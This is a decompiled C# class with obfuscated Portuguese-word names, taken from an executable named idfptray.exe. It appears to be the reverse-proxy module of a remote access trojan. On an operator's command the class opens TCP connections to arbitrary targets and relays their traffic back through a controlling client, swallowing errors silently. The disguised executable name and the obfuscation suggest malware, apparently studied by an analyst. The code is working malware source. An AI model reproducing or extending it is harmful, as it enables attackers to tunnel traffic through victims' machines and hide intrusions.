// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.ReverseProxy.JANTAR426CAVE
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Net;
using System.Net.Sockets;
using VERMELHO265MONARCA.Core.Networking;
using VERMELHO265MONARCA.Core.ReverseProxy.Packets;

namespace VERMELHO265MONARCA.Core.ReverseProxy
{
  public class JANTAR426CAVE
  {
    public const int BUFFER_SIZE = 8192;
    private byte[] TAPETAO72SERVIL;
    private bool AQUOSO541INSOLACAO;

    public int ConnectionId { get; private set; }

    public Socket Handle { get; private set; }

    public string Target { get; private set; }

    public int Port { get; private set; }

    public Client Client { get; private set; }

    public JANTAR426CAVE(FAROFA785MANOBRA command, Client client)
    {
      this.ConnectionId = command.ConnectionId;
      this.Target = command.Target;
      this.Port = command.Port;
      this.Client = client;
      this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      this.Handle.BeginConnect(command.Target, command.Port, new AsyncCallback(this.Handle_Connect), (object) null);
    }

    private void Handle_Connect(IAsyncResult ar)
    {
      try
      {
        this.Handle.EndConnect(ar);
      }
      catch
      {
      }
      if (this.Handle.Connected)
      {
        try
        {
          this.TAPETAO72SERVIL = new byte[8192];
          this.Handle.BeginReceive(this.TAPETAO72SERVIL, 0, this.TAPETAO72SERVIL.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), (object) null);
        }
        catch
        {
          new FAROFA785MANOBRAResponse(this.ConnectionId, false, (IPAddress) null, 0, this.Target).Execute(this.Client);
          this.Disconnect();
        }
        IPEndPoint localEndPoint = (IPEndPoint) this.Handle.LocalEndPoint;
        new FAROFA785MANOBRAResponse(this.ConnectionId, true, localEndPoint.Address, localEndPoint.Port, this.Target).Execute(this.Client);
      }
      else
        new FAROFA785MANOBRAResponse(this.ConnectionId, false, (IPAddress) null, 0, this.Target).Execute(this.Client);
    }

    private void AsyncReceive(IAsyncResult ar)
    {
      try
      {
        int length = this.Handle.EndReceive(ar);
        if (length <= 0)
        {
          this.Disconnect();
          return;
        }
        byte[] data = new byte[length];
        Array.Copy((Array) this.TAPETAO72SERVIL, (Array) data, length);
        new ANGUSTIADO349MONITORIA(this.ConnectionId, data).Execute(this.Client);
      }
      catch
      {
        this.Disconnect();
        return;
      }
      try
      {
        this.Handle.BeginReceive(this.TAPETAO72SERVIL, 0, this.TAPETAO72SERVIL.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), (object) null);
      }
      catch
      {
        this.Disconnect();
      }
    }

    public void Disconnect()
    {
      if (!this.AQUOSO541INSOLACAO)
      {
        this.AQUOSO541INSOLACAO = true;
        new ReverseProxyDisconnect(this.ConnectionId).Execute(this.Client);
      }
      try
      {
        this.Handle.Close();
      }
      catch
      {
      }
      this.Client.RemoveProxyClient(this.ConnectionId);
    }

    public void SendToTargetServer(byte[] data)
    {
      try
      {
        this.Handle.Send(data);
      }
      catch
      {
        this.Disconnect();
      }
    }
  }
}
